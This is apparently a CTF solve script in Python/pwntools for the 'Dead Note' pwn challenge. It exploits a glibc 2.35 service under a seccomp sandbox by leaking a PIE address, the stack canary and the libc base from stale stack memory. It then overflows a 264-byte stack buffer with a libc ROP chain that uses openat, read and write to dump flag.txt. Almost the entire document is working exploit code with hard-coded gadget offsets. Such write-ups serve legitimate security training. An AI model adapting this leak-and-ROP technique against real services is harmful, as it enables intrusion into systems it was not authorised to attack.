#!/usr/bin/env python3
# Dead Note (BCS CTF 26, Pwn) - glibc 2.35, seccomp-sandboxed stack ORW.
#
# Leaks:  the banner's "system() @ %p" is actually rogue_filter's address -> PIE leak.
#         The PoW token is answered with resp[i] = token[i] ^ 0xA5 ^ (13*i).
#         read_memo() always fwrite()s 256 bytes of its stack buffer regardless of how
#         much of it the memo actually filled -> a short memo leaks stale stack from the
#         previous call: leak[0xe8:0xf0] is the stack canary, leak[0xb8:0xc0] is a fixed
#         libc return address (libc_base + 0x43654). Both offsets are stable run to run
#         because every request runs the same call sequence inside a fresh forked child.
# Bug:    read_memo() copies up to sizes[idx] (max 0x280) bytes into a 264-byte stack
#         buffer with no bound check -> stack buffer overflow past the canary and saved
#         return address, inside the per-request forked worker.
# Sandbox: seccomp kills execve/execveat and makes open() return -EACCES, but never
#         touches openat() (or read/write) -> no shell is possible, so the payload is a
#         plain libc ROP chain doing read -> openat -> read -> write to cat flag.txt
#         straight back over the socket.
#
# Usage:
#   python3 solve.py remote     # 172.16.38.22:6657 (default)
#   python3 solve.py local      # run the binary locally (needs deadnote, libc.so.6,
#                                # ld-linux-x86-64.so.2 alongside, or edit the paths below)
from pwn import *
import re, sys, os, time

context.arch = "amd64"
context.log_level = "info"

HERE = os.path.dirname(os.path.abspath(__file__))
CHAL = os.path.join(HERE, "..", "..", "..", "pwn", "pwn-deadnote")
LD, LIBC, EXE = (os.path.join(CHAL, n) for n in
                 ("ld-linux-x86-64.so.2", "libc.so.6", "deadnote"))

MODE = sys.argv[1] if len(sys.argv) > 1 else "remote"
if MODE == "remote":
    io = remote("172.16.38.22", 6657)
else:
    io = process([LD, "--library-path", CHAL, EXE])

# ---- libc gadget offsets (Ubuntu GLIBC 2.35-0ubuntu3.14, from the target's own libc) ----
G_POP_RDI     = 0x2a3e5   # pop rdi ; ret
G_POP_RSI     = 0x2be51   # pop rsi ; ret
G_POP_RDX_RBX = 0x90469   # pop rdx ; pop rbx ; ret
G_POP_RAX     = 0x45eb0   # pop rax ; ret
G_SYSCALL_RET = 0x912d6   # syscall ; ret

LIBC_LEAK_OFF = 0x43654   # leak[0xb8:0xc0] == libc_base + this
CANARY_OFF    = 0xe8
LIBC_OFF      = 0xb8

# ---------------- gate: PoW + free PIE leak ----------------
data = io.recvuntil(b"> ", timeout=10).decode("latin1")
diag = int(re.search(r"system\(\) @ (0x[0-9a-f]+)", data).group(1), 16)
tok  = bytes.fromhex(re.search(r"Token: ([0-9a-f]{64})", data).group(1))
pie  = diag - 0x12b9
io.send(bytes(((tok[i] ^ 0xA5 ^ ((13 * i) & 0xff)) & 0xff) for i in range(32)))
log.info("PIE base = %#x" % pie)

# ---------------- menu helpers (shuffled numbering each connection) ----------------
mm = {}
def parse_menu():
    block = io.recvuntil(b"$ ", timeout=10).decode("latin1")
    mm.clear()
    for line in block.splitlines():
        m = re.match(r"\s*(\d+)\)\s*(Write|Read|Remove|List|About|Exit)", line)
        if m:
            mm[m.group(2)] = int(m.group(1))
    return block

def choose(action):
    io.sendline(str(mm[action]).encode())

def write_memo(size, blob):
    choose("Write")
    io.recvuntil(b"Size?"); io.recvuntil(b"\n")
    io.sendline(str(size).encode())
    io.recvuntil(b"Data?"); io.recvuntil(b"\n")
    io.send(blob.ljust(size, b"\x00")[:size])
    io.recvuntil(b"memo frozen")

def read_short(idx):
    """Reads a memo whose size is small enough that the worker survives cleanly."""
    choose("Read")
    io.recvuntil(b"Index?"); io.recvuntil(b"\n")
    io.sendline(str(idx).encode())
    buf = b""
    while b"page served" not in buf and b"the page resisted" not in buf:
        chunk = io.recv(timeout=5)
        if not chunk:
            break
        buf += chunk
    return buf[:256]

parse_menu()

# ---------------- Phase A: leak canary + libc from a short memo ----------------
write_memo(32, b"A" * 32)          # note 0
parse_menu()
leak = read_short(0)
canary    = u64(leak[CANARY_OFF:CANARY_OFF + 8])
libc_base = u64(leak[LIBC_OFF:LIBC_OFF + 8]) - LIBC_LEAK_OFF
assert canary & 0xff == 0,      "canary low byte not 0 -> offsets drifted, re-check locally"
assert libc_base & 0xfff == 0,  "libc base not page aligned -> offsets drifted"
log.success("canary    = %#x" % canary)
log.success("libc base = %#x" % libc_base)

pop_rdi     = libc_base + G_POP_RDI
pop_rsi     = libc_base + G_POP_RSI
pop_rdx_rbx = libc_base + G_POP_RDX_RBX
pop_rax     = libc_base + G_POP_RAX
syscall_ret = libc_base + G_SYSCALL_RET

scratch = pie + 0x4900   # writable BSS page inside the PIE image
flagbuf = pie + 0x4a00

def sc(nr, a, b, c):
    return flat(pop_rdi, a, pop_rsi, b, pop_rdx_rbx, c, 0, pop_rax, nr, syscall_ret)

rop  = sc(0,   0, scratch, 16)                  # read(0, scratch, 16)  <- "flag.txt"
rop += sc(257, 0xffffffffffffff9c, scratch, 0)  # openat(AT_FDCWD, scratch, O_RDONLY)
rop += sc(0,   3, flagbuf, 0x100)               # read(3, flagbuf, 0x100)
rop += sc(1,   1, flagbuf, 0x100)               # write(1, flagbuf, 0x100)

payload = b"A" * 264 + p64(canary) + p64(pie + 0x4020) + rop
assert len(payload) <= 0x280, len(payload)
log.info("payload len = %d" % len(payload))

# ---------------- Phase B: overflow inside the forked worker ----------------
write_memo(len(payload), payload)   # note 1
parse_menu()
choose("Read")
io.recvuntil(b"Index?"); io.recvuntil(b"\n")
io.sendline(b"1")
time.sleep(0.3)
io.send(b"flag.txt\x00")            # feeds the ROP chain's read(0, scratch, 16)

out = b""
try:
    while b"bcsctf{" not in out:
        chunk = io.recv(timeout=5)
        if not chunk:
            break
        out += chunk
except EOFError:
    pass

m = re.search(rb"bcsctf\{[^}]*\}", out)
if m:
    log.success("FLAG: %s" % m.group(0).decode())
else:
    log.failure("no flag; tail=%r" % out[-200:])
io.close()
